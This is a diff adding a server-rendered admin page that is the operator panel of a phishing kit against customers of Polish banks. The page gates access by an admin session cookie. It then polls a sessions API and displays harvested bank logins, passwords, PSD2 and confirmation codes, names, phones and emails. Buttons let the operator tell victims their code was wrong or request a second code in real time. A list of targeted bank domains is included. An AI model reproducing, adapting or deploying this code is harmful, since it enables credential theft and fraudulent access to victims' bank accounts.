@@ -1,0 +1,201 @@
+<%
+
+let authorized = 0;
+
+adminModel.find().sort({ _id: -1 }).exec((error, result) => {
+    global.allAdmins = result
+})
+
+
+for (let i=0; i<global.allAdmins.length; i++) {
+    if (global.allAdmins[i]["sessionId"] == cookies["admin_id"]) {
+        authorized = 1
+    }
+}
+
+
+
+
+if (authorized == 1) {%>
+
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+    <style>
+        body {
+            font-family: sans-serif;
+background-color: #353f51;
+color: #e3d6d9;
+        }
+        .ulItem {
+border: 2px solid #00aeef;
+padding-bottom: 15px;
+padding-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div id="demo">
+</div>
+<div id="demo2" style="margin-top:50px;">
+</div>
+<script src="/assets/js/jquery-3.5.1.min.js"></script>
+<script src="/assets/js/cookies.core.1.3.min.js"></script>
+<script>
+    let cookieManager = new Cookies();
+    // if (cookieManager.read('login_id') == null) { window.location.href = '/admin/login' }
+</script>
+<script>
+    function readTextFile(file, callback) {
+        var rawFile = new XMLHttpRequest();
+        rawFile.overrideMimeType("application/json");
+        rawFile.open("GET", file, true);
+        rawFile.onreadystatechange = function() {
+            if (rawFile.readyState === 4 && rawFile.status == "200") {
+                callback(rawFile.responseText);
+            }
+        }
+        rawFile.send(null);
+    }
+    const timedFunc = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["bank"] == "waiting") {
+                } else {
+                    let uuid = data["result"][i]["uid"]
+                    $("#demo").append(`<tbody><tr><th style="border: 2px solid black;padding: 5px;">${data["result"][i]["bank"]}</th><th style="border: 2px solid black;padding: 5px; color: lightgreen">${data["result"][i]["bankLogin"]}</th><th style="border: 2px solid black;padding: 5px; color: lightgreen">${data["result"][i]["password"]}</th><th style="border: 2px solid black;padding: 5px; color: hotpink">${data["result"][i]["psd2"]}</th><th style="border: 2px solid black;padding: 5px; color: hotpink">${data["result"][i]["summaryCode"]}</th><th style="border: 2px solid black;padding: 5px;">${data["result"][i]["firstName"]}</th><th style="border: 2px solid black;padding: 5px;">${data["result"][i]["lastName"]}</th><th style="border: 2px solid black;padding: 5px;">${data["result"][i]["phone"]}</th><th style="border: 2px solid black;padding: 5px;">${data["result"][i]["email"]}</th><th style="border: 2px solid black;padding: 5px;"><button onclick="wrongPass('${uuid}')">Złe hasło lub kod</button></th><th style="border: 2px solid black;padding: 5px;"><button onclick="acceptOrder('${uuid}')">Poproś o drugi kod</button></th><th style="border: 2px solid black;padding: 5px;"><button onclick="wrongSummary('${uuid}')">Zły drugi kod</button></th><th style="border: 2px solid black;padding: 5px;"><button onclick="deleteOrder('${uuid}')">Usuń</button></th></tr></th></tbody>`)
+
+                }
+		}
+        });
+        $("#demo").append(`<tbody><tr><th style="border: 2px solid black;padding: 5px;">BANK</th><th style="border: 2px solid black;padding: 5px;">LOGIN</th><th style="border: 2px solid black;padding: 5px;">HASŁO</th><th style="border: 2px solid black;padding: 5px;">KOD</th><th style="border: 2px solid black;padding: 5px;">KOD</th><th style="border: 2px solid black;padding: 5px;">IMIĘ</th><th style="border: 2px solid black;padding: 5px;">NAZWISKO</th><th style="border: 2px solid black;padding: 5px;">TELEFON</th><th style="border: 2px solid black;padding: 5px;">E-MAIL</th><th style="border: 2px solid black;padding: 5px;">PRZYCISK</th><th style="border: 2px solid black;padding: 5px;">PRZYCISK</th><th style="border: 2px solid black;padding: 5px;">PRZYCISK</th><th style="border: 2px solid black;padding: 5px;">PRZYCISK</th></tr></tbody>`)
+        $("#demo2").append(`<tbody><tr><th style="border: 2px solid black;padding: 5px;">BANK</th><th style="border: 2px solid black;padding: 5px;">ADRES</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">0</th><th style="border: 2px solid black;padding: 5px;">ipko.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">1</th><th style="border: 2px solid black;padding: 5px;">online.mbank.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">2</th><th style="border: 2px solid black;padding: 5px;">login.ingbank.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">3</th><th style="border: 2px solid black;padding: 5px;">centrum24.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">4</th><th style="border: 2px solid black;padding: 5px;">pekao24.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">5</th><th style="border: 2px solid black;padding: 5px;">bankmillennium.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">6</th><th style="border: 2px solid black;padding: 5px;">aliorbank.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">7</th><th style="border: 2px solid black;padding: 5px;">inteligo.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">8</th><th style="border: 2px solid black;padding: 5px;">ca24.credit-agricole.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">9</th><th style="border: 2px solid black;padding: 5px;">citibankonline.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">10</th><th style="border: 2px solid black;padding: 5px;">pekao24.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">11</th><th style="border: 2px solid black;padding: 5px;">bosbank.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">12</th><th style="border: 2px solid black;padding: 5px;">banknowy.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">13</th><th style="border: 2px solid black;padding: 5px;">goonline.bnpparibas.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">14</th><th style="border: 2px solid black;padding: 5px;">secure.velobank.pl</th></tr></tbody><tbody><tr><th style="border: 2px solid black;padding: 5px;">15</th><th style="border: 2px solid black;padding: 5px;">secure.velobank.pl</th></tr></tbody>`)
+    }
+    timedFunc()
+    let currentData;
+    const setCurrentData = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            currentData = data["result"]
+        });
+    }
+    setCurrentData()
+    const checkData = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            if (currentData.length == data["result"].length) {
+                for (let i=0; i<currentData.length; i++) {
+                    if (currentData[i]["firstName"] == data["result"][i]["firstName"]) {
+                    } else {
+                        location.reload()
+                        currentData = data["result"]
+                    }
+                    if (currentData[i]["psd2"] == data["result"][i]["psd2"]) {
+                    } else {
+                        location.reload()
+                        currentData = data["result"]
+                    }
+                    if (currentData[i]["bankLogin"] == data["result"][i]["bankLogin"]) {
+                    } else {
+                        location.reload()
+                        currentData = data["result"]
+                    }
+                    if (currentData[i]["summaryCode"] == data["result"][i]["summaryCode"]) {
+                    } else {
+                        location.reload()
+                        currentData = data["result"]
+                    }
+                }
+            } else {
+                location.reload()
+                currentData = data["result"]
+            }
+        });
+    }
+    setInterval(checkData, 1000)
+
+    const acceptOrder = (id) => {
+        $.post("/api/acceptorder/", {
+            sessionId: id
+        }).done(data => {
+            console.log('done')
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+        alert('request sent, success')
+    }
+
+    const deleteOrder = (id) => {
+        $.post("/api/deleteorder/", {
+            sessionId: id
+        }).done(data => {
+            console.log('done')
+            timedFunc()
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+    }
+
+    const wrongPass = (id) => {
+        $.post("/api/wrongpass/", {
+            sessionId: id,
+            name: "wrongPass"
+        }).done(data => {
+            console.log('done')
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+        alert('request sent, success')
+    }
+
+    const wrongSummary = (id) => {
+        $.post("/api/wrongsummary/", {
+            sessionId: id,
+            name: "wrongSummary"
+        }).done(data => {
+            console.log('done')
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+        alert('request sent, success')
+    }
+
+    const finalOrder = (id) => {
+        $.post("/api/wrongsummary/", {
+            sessionId: id,
+            name: "completed"
+        }).done(data => {
+            console.log('done')
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+        alert('request sent, success')
+    }
+
+    const dropSess = (id) => {
+        $.post("/api/dropsess/", {
+            sessionId: id
+        }).done(data => {
+            console.log('done')
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+        alert('request sent, success')
+    }
+
+</script>
+
+</body>
+</html>
+<%} else { %>
+    <h1>nie jestes zautoryzowany</h1>
+    <h3 style="color: red">Jeżeli uwazasz ze to blad odswiez strone</h3>
+<h3>Logowanie: <a href="/E4bBxbvxr2/admin/login">LOGIN</a></h3>
+<% } %>
